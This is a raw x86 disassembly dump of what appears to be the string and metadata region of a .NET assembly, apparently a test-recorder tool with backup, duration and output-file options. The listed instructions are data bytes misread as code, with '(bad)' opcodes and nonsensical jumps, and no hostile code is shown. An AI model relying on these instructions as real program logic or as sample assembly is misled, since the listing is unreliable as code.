  4033c4:	and    BYTE PTR [ebp+0x72],al
  4033c7:	jb     0x403438
  4033c9:	jb     0x4033eb
  4033cb:	jo     0x40342e
  4033cd:	jne    0x403442
  4033cf:	imul   ebp,DWORD PTR [esi+0x67],0x65687420
  4033d6:	and    BYTE PTR [edx+0x65],dh
  4033d9:	arpl   WORD PTR [edi+0x72],bp
  4033dc:	imul   ebp,DWORD PTR fs:[esi+0x67],0x307b203a
  4033e4:	jge    0x4033e7
  4033e6:	and    DWORD PTR [ebp+0x72],eax
  4033e9:	jb     0x40345a
  4033eb:	jb     0x40340d
  4033ed:	jb     0x403454
  4033ef:	jae    0x403466
  4033f1:	ins    DWORD PTR es:[edi],dx
  4033f2:	imul   ebp,DWORD PTR [esi+0x67],0x65687420
  4033f9:	and    BYTE PTR [edx+0x65],dh
  4033fc:	arpl   WORD PTR [edi+0x72],bp
  4033ff:	imul   ebp,DWORD PTR fs:[esi+0x67],0x307b203a
  403407:	jge    0x40340a
  403409:	sbb    al,0x45
  40340b:	jb     0x40347f
  40340d:	outs   dx,DWORD PTR ds:[esi]
  40340e:	jb     0x403430
  403410:	jae    0x403486
  403412:	popa   
  403413:	jb     0x403489
  403415:	imul   ebp,DWORD PTR [esi+0x67],0x63657220
  40341c:	outs   dx,DWORD PTR ds:[esi]
  40341d:	jb     0x403483
  40341f:	gs jb  0x40345c
  403422:	and    BYTE PTR [ebx+0x30],bh
  403425:	jge    0x403428
  403427:	sbb    al,0x45
  403429:	jb     0x40349d
  40342b:	outs   dx,DWORD PTR ds:[esi]
  40342c:	jb     0x40344e
  40342e:	jae    0x4034a4
  403430:	outs   dx,DWORD PTR ds:[esi]
  403431:	jo     0x4034a3
  403433:	imul   ebp,DWORD PTR [esi+0x67],0x63657220
  40343a:	outs   dx,DWORD PTR ds:[esi]
  40343b:	jb     0x4034a1
  40343d:	gs jb  0x40347a
  403440:	and    BYTE PTR [ebx+0x30],bh
  403443:	jge    0x403446
  403445:	lods   al,BYTE PTR ds:[esi]
  403446:	add    DWORD PTR ds:0x5453560a,ecx
  40344c:	gs jae 0x4034c3
  40344f:	push   esi
  403450:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x6f636552
  403458:	jb     0x4034be
  40345a:	gs jb  0x40347d
  40345d:	pop    ebx
  40345e:	sub    eax,0x75616f6e
  403463:	imul   ebp,DWORD PTR fs:[edi+0x5d],0x6e2d5b20
  40346b:	outs   dx,DWORD PTR ds:[esi]
  40346c:	jbe    0x4034d7
  40346e:	fs outs dx,DWORD PTR gs:[esi]
  403471:	pop    ebp
  403472:	and    BYTE PTR [ebx+0x2d],bl
  403475:	bound  ebp,QWORD PTR [ecx+0x74]
  403478:	jb     0x4034db
  40347a:	je     0x4034e1
  40347c:	and    BYTE PTR [esi+esi*2],bh
  40347f:	popa   
  403480:	ins    BYTE PTR es:[edi],dx
  403481:	jne    0x4034e8
  403483:	ds pop ebp
  403485:	and    BYTE PTR ds:0x2020200a,cl
  40348b:	and    BYTE PTR [eax],ah
  40348d:	and    BYTE PTR [eax],ah
  40348f:	and    BYTE PTR [eax],ah
  403491:	and    BYTE PTR [eax],ah
  403493:	and    BYTE PTR [eax],ah
  403495:	and    BYTE PTR [eax],ah
  403497:	and    BYTE PTR [eax],ah
  403499:	and    BYTE PTR [eax],ah
  40349b:	and    BYTE PTR [ebx+0x2d],bl
  40349e:	data16 jb 0x403502
  4034a1:	ins    DWORD PTR es:[edi],dx
  4034a2:	gs jb  0x403506
  4034a5:	je     0x40350c
  4034a7:	and    BYTE PTR [esi+esi*2],bh
  4034aa:	popa   
  4034ab:	ins    BYTE PTR es:[edi],dx
  4034ac:	jne    0x403513
  4034ae:	ds pop ebp
  4034b0:	and    BYTE PTR [ebx+0x2d],bl
  4034b3:	fs jne 0x403528
  4034b6:	popa   
  4034b7:	je     0x403522
  4034b9:	outs   dx,DWORD PTR ds:[esi]
  4034ba:	outs   dx,BYTE PTR ds:[esi]
  4034bb:	and    BYTE PTR [esi+esi*2],bh
  4034be:	popa   
  4034bf:	ins    BYTE PTR es:[edi],dx
  4034c0:	jne    0x403527
  4034c2:	ds pop ebp
  4034c4:	or     eax,0x2020200a
  4034c9:	and    BYTE PTR [eax],ah
  4034cb:	and    BYTE PTR [eax],ah
  4034cd:	and    BYTE PTR [eax],ah
  4034cf:	and    BYTE PTR [eax],ah
  4034d1:	and    BYTE PTR [eax],ah
  4034d3:	and    BYTE PTR [eax],ah
  4034d5:	and    BYTE PTR [eax],ah
  4034d7:	and    BYTE PTR [eax],ah
  4034d9:	and    BYTE PTR [ebx+0x2d],bl
  4034dc:	outs   dx,DWORD PTR ds:[esi]
  4034dd:	jne    0x403553
  4034df:	jo     0x403556
  4034e1:	je     0x403549
  4034e3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x6e],0x20656d61
  4034eb:	cmp    al,0x76
  4034ed:	popa   
  4034ee:	ins    BYTE PTR es:[edi],dx
  4034ef:	jne    0x403556
  4034f1:	ds pop ebp
  4034f3:	add    BYTE PTR [edx+0x53],al
  4034f6:	dec    edx
  4034f7:	inc    edx
  4034f8:	add    DWORD PTR [eax],eax
  4034fa:	add    DWORD PTR [eax],eax
  4034fc:	add    BYTE PTR [eax],al
  4034fe:	add    BYTE PTR [eax],al
  403500:	or     al,0x0
  403502:	add    BYTE PTR [eax],al
  403504:	jbe    0x40353a
  403506:	xor    BYTE PTR cs:[esi],ch
  403509:	xor    esi,DWORD PTR [eax]
  40350b:	xor    esi,DWORD PTR [ecx]
  40350d:	cmp    DWORD PTR [eax],eax
  40350f:	add    BYTE PTR [eax],al
  403511:	add    BYTE PTR ds:0x6c00,al
  403517:	add    al,al
  403519:	sldt   WORD PTR [eax]
  40351c:	and    edi,DWORD PTR [esi+0x0]
  40351f:	add    BYTE PTR [eax+edx*1],ch
  403522:	add    BYTE PTR [eax],al
  403524:	xor    al,0x15
  403526:	add    BYTE PTR [eax],al
  403528:	and    edx,DWORD PTR [ebx+0x74]
  40352b:	jb     0x403596
  40352d:	outs   dx,BYTE PTR ds:[esi]
  40352e:	addr16 jae 0x403531
  403531:	add    BYTE PTR [eax],al
  403533:	add    BYTE PTR [eax+0x25],ah
  403536:	add    BYTE PTR [eax],al
  403538:	jo     0x40354a
  40353a:	add    BYTE PTR [eax],al
  40353c:	and    edx,DWORD PTR [ebp+0x53]
  40353f:	add    al,dl
  403541:	xor    eax,0x100000
  403546:	add    BYTE PTR [eax],al
  403548:	and    eax,DWORD PTR [edi+0x55]
  40354b:	dec    ecx
  40354c:	inc    esp
  40354d:	add    BYTE PTR [eax],al
  40354f:	add    al,ah
  403551:	xor    eax,0x8240000
  403556:	add    BYTE PTR [eax],al
  403558:	and    eax,DWORD PTR [edx+0x6c]
  40355b:	outs   dx,DWORD PTR ds:[esi]
  40355c:	bound  eax,QWORD PTR [eax]
  40355e:	add    BYTE PTR [eax],al
  403560:	add    BYTE PTR [eax],al
  403562:	add    BYTE PTR [eax],al
  403564:	add    al,BYTE PTR [eax]
  403566:	add    BYTE PTR [ecx],al
  403568:	push   edi
  403569:	aas    
  40356a:	mov    ds:0x3091d,al
  40356f:	add    BYTE PTR [eax],al
  403571:	cli    
  403572:	and    eax,0x160033
  403577:	add    BYTE PTR [ecx],al
  403579:	add    BYTE PTR [eax],al
  40357b:	add    BYTE PTR [eax+eax*1+0x0],bl
  40357f:	add    BYTE PTR [ecx],cl
  403581:	add    BYTE PTR [eax],al
  403583:	add    BYTE PTR [ebx],bl
  403585:	add    BYTE PTR [eax],al
  403587:	add    BYTE PTR [eax+0x0],dl
  40358a:	add    BYTE PTR [eax],al
  40358c:	add    BYTE PTR ds:[eax],al
  40358f:	add    BYTE PTR [edx],al
  403591:	add    BYTE PTR [eax],al
  403593:	add    BYTE PTR [eax+0x0],dh
  403596:	add    BYTE PTR [eax],al
  403598:	push   es
  403599:	add    BYTE PTR [eax],al
  40359b:	add    BYTE PTR [eax],bh
  40359d:	add    BYTE PTR [eax],al
  40359f:	add    BYTE PTR [edx],al
  4035a1:	add    BYTE PTR [eax],al
  4035a3:	add    BYTE PTR [ebx],dl
  4035a5:	add    BYTE PTR [eax],al
  4035a7:	add    BYTE PTR [edx],al
  4035a9:	add    BYTE PTR [eax],al
  4035ab:	add    BYTE PTR [ebx],dl
  4035ad:	add    BYTE PTR [eax],al
  4035af:	add    BYTE PTR [esi],bl
  4035b1:	add    BYTE PTR [eax],al
  4035b3:	add    BYTE PTR [ecx],al
  4035b5:	add    BYTE PTR [eax],al
  4035b7:	add    BYTE PTR [ebx],al
  4035b9:	add    BYTE PTR [eax],al
  4035bb:	add    BYTE PTR [esi],al
  4035bd:	add    BYTE PTR [eax],al
  4035bf:	add    BYTE PTR [ecx],al
  4035c1:	add    BYTE PTR [eax],al
  4035c3:	add    BYTE PTR [eax+eax*1],al
  4035c6:	add    BYTE PTR [eax],al
  4035c8:	add    DWORD PTR [eax],eax
  4035ca:	add    BYTE PTR [eax],al
  4035cc:	add    DWORD PTR [eax],eax
  4035ce:	add    BYTE PTR [eax],al
  4035d0:	add    BYTE PTR [eax],al
  4035d2:	or     al,BYTE PTR [eax]
  4035d4:	add    DWORD PTR [eax],eax
  4035d6:	add    BYTE PTR [eax],al
  4035d8:	add    BYTE PTR [eax],al
  4035da:	push   es
  4035db:	add    BYTE PTR [ecx+eax*1],ch
  4035de:	and    eax,0x33000601
  4035e3:	add    DWORD PTR ds:0x46000601,esp
  4035e9:	add    DWORD PTR ds:0xcb000601,esp
  4035ef:	add    DWORD PTR ds:0xaa000a01,esp
  4035f5:	add    al,BYTE PTR [ebp+0x15000602]
  4035fb:	add    esp,DWORD PTR ds:0x42000601
  403601:	add    esp,DWORD PTR ds:0xc7000601
  403607:	add    esi,DWORD PTR [esi+0x11000603]
  40360d:	add    al,0xf1
  40360f:	add    ecx,DWORD PTR [esi]
  403611:	add    al,al
  403613:	add    al,0xad
  403615:	add    al,0x6
  403617:	add    BYTE PTR [esi],ch
  403619:	push   es
  40361a:	adc    eax,DWORD PTR [esi]
  40361c:	push   es
  40361d:	add    BYTE PTR [eax],dl
  40361f:	or     BYTE PTR ds:0xa3000601,ah
  403625:	or     BYTE PTR [esi-0x23fff9fd],dh
  40362b:	or     bl,cl
  40362d:	or     BYTE PTR [esi],al
  40362f:	add    BYTE PTR ds:0x608f809,cl
  403635:	add    BYTE PTR [eax+0x601250a],dh
  40363b:	add    BYTE PTR [eax],cl
  40363d:	or     ebp,ecx
  40363f:	or     al,BYTE PTR [esi]
  403641:	add    BYTE PTR [edi],ch
  403643:	or     ebp,ecx
  403645:	or     al,BYTE PTR [esi]
  403647:	add    BYTE PTR [edx+0xb],al
  40364a:	jmp    0x50403c59
  40364f:	or     ebp,ecx
  403651:	or     al,BYTE PTR [esi]
  403653:	add    BYTE PTR [esi+0xb],dh
  403656:	pop    esp
  403657:	or     eax,DWORD PTR [esi]
  403659:	add    BYTE PTR [edi+0x60ae90b],cl
  40365f:	add    BYTE PTR [ebx+0x601250b],ah
  403665:	add    bl,cl
  403667:	or     edi,DWORD PTR [ecx-0x1dfff9f5]
  40366d:	or     edi,DWORD PTR [ecx-0xfff9f5]
  403673:	or     edi,DWORD PTR [ecx+0x1d00060b]
  403679:	or     al,0xb9
  40367b:	or     eax,DWORD PTR [esi]
  40367d:	add    BYTE PTR [esi],dh
  40367f:	or     al,0xb9
  403681:	or     eax,DWORD PTR [esi]
  403683:	add    BYTE PTR [edi+0xc],cl
  403686:	mov    ecx,0x6a00060b
  40368b:	or     al,0xb9
  40368d:	or     eax,DWORD PTR [esi]
  40368f:	add    BYTE PTR [ebx+0x60bb90c],al
  403695:	add    BYTE PTR [eax+0x60bb90c],ah
  40369b:	add    dh,al
  40369d:	or     al,0xcb
  40369f:	or     BYTE PTR [esi],al
  4036a1:	add    al,ch
  4036a3:	or     al,0xcb
  4036a5:	or     BYTE PTR [esi],al
  4036a7:	add    BYTE PTR [edx],cl
  4036a9:	or     eax,0x60bb9
  4036ae:	and    eax,0x60bb90d
  4036b3:	add    BYTE PTR [esi],bh
  4036b5:	or     eax,0x603f1
  4036ba:	pop    esp
  4036bb:	or     eax,0x603f1
  4036c0:	js     0x4036cf
  4036c2:	lods   eax,DWORD PTR ds:[esi]
  4036c3:	add    al,0x9f
  4036c5:	add    BYTE PTR [ebp+ecx*1+0x60000],cl
  4036cc:	fwait
  4036cd:	or     eax,0xe03f1
  4036d2:	iret   
  4036d3:	or     eax,0x604ad
  4036d8:	out    0xd,al
  4036da:	and    eax,0x15000601
  4036df:	push   cs
  4036e0:	and    eax,0x1c000601
  4036e5:	push   cs
  4036e6:	and    eax,0x2c000601
  4036eb:	push   cs
  4036ec:	and    eax,0x48000601
  4036f1:	push   cs
  4036f2:	and    eax,0x92000601
  4036f7:	push   cs
  4036f8:	and    eax,0x98000601
  4036fd:	push   cs
  4036fe:	and    eax,0xc0000601
  403703:	push   cs
  403704:	and    eax,0xca000601
  403709:	push   cs
  40370a:	mov    dh,0x3
  40370c:	push   es
  40370d:	add    al,bl
  40370f:	push   cs
  403710:	mov    dh,0x3
  403712:	push   es
  403713:	add    ah,ch
  403715:	push   cs
  403716:	mov    dh,0x3
  403718:	push   es
  403719:	add    BYTE PTR [edx],cl
  40371b:	(bad)  
  40371d:	add    al,BYTE PTR [esi]
  40371f:	add    BYTE PTR [ebx],bl
  403721:	(bad)  
  403723:	add    al,BYTE PTR [esi]
  403725:	add    BYTE PTR [edx],ch
  403727:	(bad)  
  403729:	add    DWORD PTR [esi],eax
  40372b:	add    BYTE PTR [edi],ch
  40372d:	(bad)  
  40372f:	add    DWORD PTR [esi],eax
  403731:	add    BYTE PTR [ebx+0xf],dl
  403734:	and    eax,0x72000601
  403739:	(bad)  
  40373b:	add    DWORD PTR [esi],eax
  40373d:	add    BYTE PTR [edx+0x601250f],ch
  403743:	add    bl,al
  403745:	cmpxchg BYTE PTR [edi],cl
  403748:	push   es
  403749:	add    al,dh
  40374b:	(bad)  
  40374d:	(bad)  
  40374f:	add    BYTE PTR ds:0x6101410,dh
  403755:	add    BYTE PTR [edi+0x10],bh
  403758:	push   edi
  403759:	adc    BYTE PTR [edx],cl
  40375b:	add    BYTE PTR [ebx+0x6101410],ah
  403761:	add    ch,al
  403763:	adc    BYTE PTR [eax-0x2efff9f1],dh
  403769:	adc    BYTE PTR [eax+edx*1],dl
  40376c:	push   es
  40376d:	add    ah,ch
  40376f:	adc    BYTE PTR [eax+edx*1],dl
  403772:	push   es
  403773:	add    BYTE PTR [edi],al
  403775:	adc    DWORD PTR [eax+edx*1],edx
  403778:	push   es
  403779:	add    BYTE PTR [edi],dl
  40377b:	adc    DWORD PTR [eax+edx*1],edx
  40377e:	push   es
  40377f:	add    BYTE PTR [ebp+0x11],ah
  403782:	and    eax,0xa4000601
  403787:	adc    ecx,esi
  403789:	add    eax,DWORD PTR [esi]
  40378b:	add    BYTE PTR [edi+0x603b611],bh
  403791:	add    ah,cl
  403793:	adc    DWORD PTR ds:0xe6000601,esp
  403799:	adc    DWORD PTR ds:0xb000601,esp
  40379f:	adc    dh,BYTE PTR [esi+0x18000603]
  4037a5:	adc    dh,BYTE PTR [esi+0x35000603]
  4037ab:	adc    ah,BYTE PTR ds:0x69000601
  4037b1:	adc    bh,BYTE PTR [ecx-0x6bfff1f5]
  4037b7:	adc    ch,BYTE PTR [ebp-0x14ffedfc]
  4037bd:	adc    dl,dh
  4037bf:	adc    cl,BYTE PTR [esi]
  4037c1:	add    BYTE PTR [edi],bl
  4037c3:	adc    eax,DWORD PTR [eax]
  4037c5:	adc    eax,DWORD PTR [esi]
  4037c7:	add    BYTE PTR [edx+0x13],bl
  4037ca:	and    eax,0x6d002f01
  4037cf:	adc    eax,DWORD PTR [eax]
  4037d1:	add    BYTE PTR [esi],al
  4037d3:	add    BYTE PTR [ebx+0x603b613],bl
  4037d9:	add    BYTE PTR [ecx+0xe012513],ch
  4037df:	add    bh,bl
  4037e1:	adc    ecx,ecx
  4037e3:	adc    eax,DWORD PTR [esi]
  4037e5:	add    ch,dh
  4037e7:	adc    ebp,ecx
  4037e9:	or     cl,BYTE PTR [esi]
  4037eb:	add    BYTE PTR [esp+edx*1+0x44],bl
  4037ef:	adc    al,0x6
  4037f1:	add    BYTE PTR [ebx+0x14],dh
  4037f4:	lods   eax,DWORD PTR ds:[esi]
  4037f5:	add    al,0xe
  4037f7:	add    BYTE PTR [edi+0xe13c914],dh
  4037fd:	add    al,dl
  4037ff:	adc    al,0xc9
  403801:	adc    eax,DWORD PTR [eax]
  403803:	add    BYTE PTR [eax],al
  403805:	add    BYTE PTR [ecx],al
  403807:	add    BYTE PTR [eax],al
  403809:	add    BYTE PTR [eax],al
  40380b:	add    BYTE PTR [ecx],al
  40380d:	add    BYTE PTR [ecx],al
  40380f:	add    BYTE PTR [ecx+0x22000000],ah
  403815:	add    BYTE PTR [ecx],dh
  403817:	add    BYTE PTR [eax],al
  403819:	add    BYTE PTR [ecx],al
  40381b:	add    BYTE PTR [ecx],al
  40381d:	add    BYTE PTR [ecx+0x60000000],ah
  403823:	add    BYTE PTR [ecx],dh
  403825:	add    BYTE PTR [eax],al
  403827:	add    BYTE PTR [ecx],al
  403829:	add    BYTE PTR ds:0x10000100,al
  40382f:	add    BYTE PTR [eax+0x0],bh
  403832:	xor    DWORD PTR [eax],eax
  403834:	add    eax,0x7000100
  403839:	add    BYTE PTR [eax],al
  40383b:	add    BYTE PTR [eax],dl
  40383d:	add    BYTE PTR [eax+0x9003100],al
  403843:	add    BYTE PTR [ecx],al
  403845:	add    BYTE PTR [edx],cl
  403847:	add    BYTE PTR [eax],al
  403849:	add    BYTE PTR [eax],dl
  40384b:	add    BYTE PTR [eax+0x500b600],bl
  403851:	add    BYTE PTR [ecx],cl
  403853:	add    BYTE PTR [eax+eax*1],bl
  403856:	add    BYTE PTR [ecx],0x10
  403859:	add    bh,ch
  40385b:	add    BYTE PTR [ecx],dh
  40385d:	add    BYTE PTR ds:0x37001700,al
  403863:	add    BYTE PTR [ebx+0x5001001],al
  403869:	add    DWORD PTR [eax],eax
  40386b:	add    BYTE PTR ds:0x40001900,al
  403871:	add    BYTE PTR [eax],al
  403873:	add    BYTE PTR [eax],dl
  403875:	add    BYTE PTR [ebx],dl
  403877:	add    DWORD PTR [esi+0x1a000500],esi
  40387d:	add    BYTE PTR [esi+0x0],al
  403880:	push   ecx
  403881:	or     BYTE PTR [esi],0x2
  403884:	xor    eax,DWORD PTR [eax]
  403886:	add    DWORD PTR [eax],eax
  403888:	pushf  
  403889:	add    esi,DWORD PTR [ebx+0x0]
  40388c:	add    DWORD PTR [eax],eax
  40388e:	stos   DWORD PTR es:[edi],eax
  40388f:	add    esi,DWORD PTR [edi+0x0]
  403892:	add    DWORD PTR [eax],eax
  403894:	fadd   DWORD PTR [ebx]
  403896:	jnp    0x403898
  403898:	add    DWORD PTR [eax],eax
  40389a:	out    0x3,al
  40389c:	jnp    0x40389e
  40389e:	add    DWORD PTR [eax],eax
  4038a0:	sbb    al,0x4
  4038a2:	jg     0x4038a4
  4038a4:	and    DWORD PTR [eax],eax
  4038a6:	and    eax,0x1008404
  4038ab:	add    BYTE PTR [esi],ch
  4038ad:	add    al,0x87
  4038af:	add    BYTE PTR [ecx-0x80],dl
  4038b2:	inc    eax
  4038b3:	add    al,0x33
  4038b5:	add    BYTE PTR [ecx-0x80],dl
  4038b8:	push   eax
  4038b9:	add    al,0x33
  4038bb:	add    BYTE PTR [ecx-0x80],dl
  4038be:	bound  eax,QWORD PTR [ebx+esi*1]
  4038c1:	add    BYTE PTR [ecx-0x80],dl
  4038c4:	jae    0x4038ca
  4038c6:	xor    eax,DWORD PTR [eax]
  4038c8:	add    DWORD PTR [eax],eax
  4038ca:	fs push es
  4038cc:	sbb    al,0x1
  4038ce:	add    DWORD PTR [eax],eax
  4038d0:	test   BYTE PTR [esi],al
  4038d2:	pop    ds
  4038d3:	add    DWORD PTR [ecx],eax
  4038d5:	add    BYTE PTR [ebx+0x1003306],ah
  4038db:	add    ah,al
  4038dd:	push   es
  4038de:	xor    eax,DWORD PTR [eax]
  4038e0:	add    DWORD PTR [eax],eax
  4038e2:	out    0x6,eax
  4038e4:	sbb    al,0x1
  4038e6:	add    DWORD PTR [eax],eax
  4038e8:	add    al,0x7
  4038ea:	sbb    al,0x1
  4038ec:	add    DWORD PTR [eax],eax
  4038ee:	and    DWORD PTR [edi],eax
  4038f0:	xor    eax,DWORD PTR [eax]
  4038f2:	add    DWORD PTR [eax],eax
  4038f4:	inc    ecx
  4038f5:	pop    es
  4038f6:	and    eax,DWORD PTR [ecx]
  4038f8:	add    DWORD PTR [eax],eax
  4038fa:	pop    edx
  4038fb:	pop    es
  4038fc:	and    eax,DWORD PTR [ecx]
  4038fe:	add    DWORD PTR [eax],eax
  403900:	jne    0x403909
  403902:	and    eax,DWORD PTR [ecx]
  403904:	adc    DWORD PTR [eax],eax
  403906:	test   eax,0x31015a08
  40390b:	add    BYTE PTR [ecx+0x51008408],bh
  403911:	add    bl,0x8
  403914:	xor    eax,DWORD PTR [eax]
  403916:	adc    DWORD PTR [eax],eax
  403918:	in     al,dx
  403919:	or     al,ch
  40391b:	add    DWORD PTR [ecx],edx
  40391d:	add    BYTE PTR [ecx],bl
  40391f:	or     esp,ebp
  403921:	add    DWORD PTR [eax],eax
  403923:	add    BYTE PTR [eax],al
  403925:	add    BYTE PTR [eax],al
  403927:	add    dh,al
  403929:	add    eax,0xa0152
  40392e:	add    DWORD PTR [eax],eax
  403930:	add    BYTE PTR [eax],al
  403932:	add    BYTE PTR [eax],al
  403934:	add    BYTE PTR [eax],al
  403936:	mov    BYTE PTR ds:0x130165,0x6
  40393d:	add    BYTE PTR [eax],al
  40393f:	add    BYTE PTR [eax],al
  403941:	add    BYTE PTR [eax],al
  403943:	add    dh,al
  403945:	add    eax,0x130177
  40394a:	push   es
  40394b:	add    BYTE PTR [eax],al
  40394d:	add    BYTE PTR [eax],al
  40394f:	add    BYTE PTR [eax],al
  403951:	add    dh,al
  403953:	add    eax,0x13018a
  403958:	push   es
  403959:	add    BYTE PTR [eax],al
  40395b:	add    BYTE PTR [eax],al
  40395d:	add    BYTE PTR [eax],al
  40395f:	add    dh,al
  403961:	add    eax,0x17019e
  403966:	push   es
  403967:	add    BYTE PTR [eax],al
  403969:	add    BYTE PTR [eax],al
  40396b:	add    BYTE PTR [eax],al
  40396d:	add    dh,al
  40396f:	add    eax,0x1e01b3
  403974:	or     BYTE PTR [eax],al
  403976:	shl    BYTE PTR [eax],1
  403978:	add    BYTE PTR [eax],al
  40397a:	add    BYTE PTR [eax],al
  40397c:	xchg   ecx,eax
  40397d:	add    dh,al
  40397f:	add    DWORD PTR [esi],esp
  403981:	add    BYTE PTR [ebx],cl
  403983:	add    BYTE PTR [eax+0x21],dh
  403986:	add    BYTE PTR [eax],al
  403988:	add    BYTE PTR [eax],al
  40398a:	xchg   ecx,eax
  40398b:	add    bh,ah
  40398d:	add    DWORD PTR [eax+eax*1],ebp
  403990:	or     al,0x0
  403992:	mov    ds:0x21,al
  403997:	add    BYTE PTR [esi+0x13020818],al
  40399d:	add    BYTE PTR [esi],cl
  40399f:	add    BYTE PTR [ecx+eiz*1+0x0],ch
  4039a6:	out    0x1,al
  4039a8:	push   edx
  4039a9:	add    DWORD PTR [edx],ecx
  4039ab:	add    BYTE PTR [esi],cl
  4039ad:	add    BYTE PTR [eax+0x22],al
  4039b3:	add    dh,ah
  4039b5:	add    DWORD PTR [edi+0x1],esi
  4039b8:	adc    eax,DWORD PTR [eax]
  4039ba:	adc    eax,DWORD PTR [eax]
  4039bc:	fwait
  4039bd:	and    al,BYTE PTR [eax]
  4039bf:	add    BYTE PTR [eax],al
  4039c1:	add    dh,ah
  4039c3:	add    DWORD PTR [edx+0x13001301],ecx
  4039c9:	add    BYTE PTR [eax+0x22],bh
  4039cf:	add    dh,ah
  4039d1:	add    DWORD PTR [ebp+0x1],esp
  4039d4:	adc    eax,DWORD PTR [eax]
  4039d6:	adc    eax,DWORD PTR [eax]
  4039d8:	cmp    BYTE PTR [ebx],ah
  4039da:	add    BYTE PTR [eax],al
  4039dc:	add    BYTE PTR [eax],al
  4039de:	xchg   BYTE PTR [eax],al
  4039e0:	and    eax,0x13001302
  4039e5:	add    BYTE PTR [eax+0x23],al
  4039eb:	add    dh,ah
  4039ed:	add    DWORD PTR [ecx],edi
  4039ef:	add    dl,BYTE PTR [ebx]
  4039f1:	add    BYTE PTR [ebx],dl
  4039f3:	add    ah,bl
  4039f5:	and    eax,DWORD PTR [eax]
  4039f7:	add    BYTE PTR [eax],al
  4039f9:	add    BYTE PTR [esi+0x51024100],al
  4039ff:	add    BYTE PTR [ebx],dl
  403a01:	add    BYTE PTR [eax],dh
  403a03:	and    al,0x0
  403a05:	add    BYTE PTR [eax],al
  403a07:	add    BYTE PTR [ecx+0x13024c00],al
  403a0d:	add    BYTE PTR [eax+eax*1],dl
  403a10:	adc    BYTE PTR ds:0x0,ah
  403a16:	add    DWORD PTR [eax],0x5702b5
  403a1c:	adc    al,0x0
  403a1e:	call   0x403a48
  403a23:	add    BYTE PTR [ecx+0x1302d400],al
  403a29:	add    BYTE PTR [eax+eax*1],dl
  403a2c:	pop    esp
  403a2d:	add    BYTE PTR es:[eax],al
  403a30:	add    BYTE PTR [eax],al
  403a32:	add    DWORD PTR [eax],0x5102e9
  403a38:	adc    al,0x0
  403a3a:	loopne 0x403a62
  403a3c:	add    BYTE PTR [eax],al
  403a3e:	add    BYTE PTR [eax],al
  403a40:	add    DWORD PTR [eax],0x130300
  403a46:	adc    eax,0x278600
  403a4b:	add    BYTE PTR [eax],al
  403a4d:	add    BYTE PTR [ecx+0x5c032c00],al
  403a53:	add    BYTE PTR ds:0x279800,dl
  403a59:	add    BYTE PTR [eax],al
  403a5b:	add    BYTE PTR [ecx+0x63034c00],al
  403a61:	add    BYTE PTR [edi],dl
  403a63:	add    BYTE PTR [eax+0x27],ah
  403a69:	add    dh,al
  403a6b:	add    BYTE PTR [eax+0x3],ah
  403a6e:	push   0x0
  403a70:	sbb    DWORD PTR [eax],eax
  403a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a73:	daa    
  403a74:	add    BYTE PTR [eax],al
  403a76:	add    BYTE PTR [eax],al
  403a78:	add    DWORD PTR [eax],0x6e037a
  403a7e:	sbb    DWORD PTR [eax],eax
  403a80:	sub    BYTE PTR fs:[eax],al
  403a83:	add    BYTE PTR [eax],al
  403a85:	add    BYTE PTR [esi+0x13020818],al
  403a8b:	add    BYTE PTR [edx],bl
  403a8d:	add    BYTE PTR [edi+0x26],bh
  403a93:	add    BYTE PTR [ecx-0x38ee8300],al
  403a99:	add    ebx,DWORD PTR [edx]
  403a9b:	add    BYTE PTR [eax+ebp*1+0x0],bl
  403aa2:	xchg   BYTE PTR [eax],bl
  403aa4:	or     BYTE PTR [edx],al
  403aa6:	adc    eax,DWORD PTR [eax]
  403aa8:	sbb    eax,DWORD PTR [eax]
  403aaa:	out    dx,al
  403aab:	sub    BYTE PTR [eax],al
  403aad:	add    BYTE PTR [eax],al
  403aaf:	add    BYTE PTR [esi-0x2afb78f8],al
  403ab5:	add    BYTE PTR [ebx],bl
  403ab7:	add    dh,dh
  403ab9:	sub    BYTE PTR [eax],al
  403abb:	add    BYTE PTR [eax],al
  403abd:	add    BYTE PTR [ecx-0x26fb65f8],al
  403ac3:	add    BYTE PTR [ebx],bl
  403ac5:	add    bh,bh
  403ac7:	sub    BYTE PTR [eax],al
  403ac9:	add    BYTE PTR [eax],al
  403acb:	add    BYTE PTR [esi-0x21fb37f8],al
  403ad1:	add    BYTE PTR [eax+eax*1],bl
  403ad4:	pop    es
  403ad5:	sub    DWORD PTR [eax],eax
  403ad7:	add    BYTE PTR [eax],al
  403ad9:	add    BYTE PTR [ecx-0x1cfb25f8],al
  403adf:	add    BYTE PTR [eax+eax*1],bl
  403ae2:	adc    BYTE PTR [ecx],ch
  403ae4:	add    BYTE PTR [eax],al
  403ae6:	add    BYTE PTR [eax],al
  403ae8:	xchg   BYTE PTR [eax],cl
  403aea:	in     al,dx
  403aeb:	add    al,0xe9
  403aed:	add    BYTE PTR ds:0x291800,bl
  403af3:	add    BYTE PTR [eax],al
  403af5:	add    BYTE PTR [ecx-0x12fafff8],al
  403afb:	add    BYTE PTR ds:0x292100,bl
  403b01:	add    BYTE PTR [eax],al
  403b03:	add    BYTE PTR [esi-0x16faebf8],al
  403b09:	add    BYTE PTR [esi],bl
  403b0b:	add    BYTE PTR [ecx],ch
  403b0d:	sub    DWORD PTR [eax],eax
  403b0f:	add    BYTE PTR [eax],al
  403b11:	add    BYTE PTR [ecx-0x12fad5f8],al
  403b17:	add    BYTE PTR [esi],bl
  403b19:	add    BYTE PTR [edx],dh
  403b1b:	sub    DWORD PTR [eax],eax
  403b1d:	add    BYTE PTR [eax],al
  403b1f:	add    BYTE PTR [esi-0x2afabff8],al
  403b25:	add    BYTE PTR [edi],bl
  403b27:	add    BYTE PTR [edx],bh
  403b29:	sub    DWORD PTR [eax],eax
  403b2b:	add    BYTE PTR [eax],al
  403b2d:	add    BYTE PTR [ecx-0x26faaff8],al
  403b33:	add    BYTE PTR [edi],bl
  403b35:	add    BYTE PTR [ebx+0x29],al
  403b38:	add    BYTE PTR [eax],al
  403b3a:	add    BYTE PTR [eax],al
  403b3c:	xchg   BYTE PTR [eax],cl
  403b3e:	pusha  
  403b3f:	add    eax,0x2000d5
  403b44:	dec    ebx
  403b45:	sub    DWORD PTR [eax],eax
  403b47:	add    BYTE PTR [eax],al
  403b49:	add    BYTE PTR [ecx-0x26fa8ff8],al
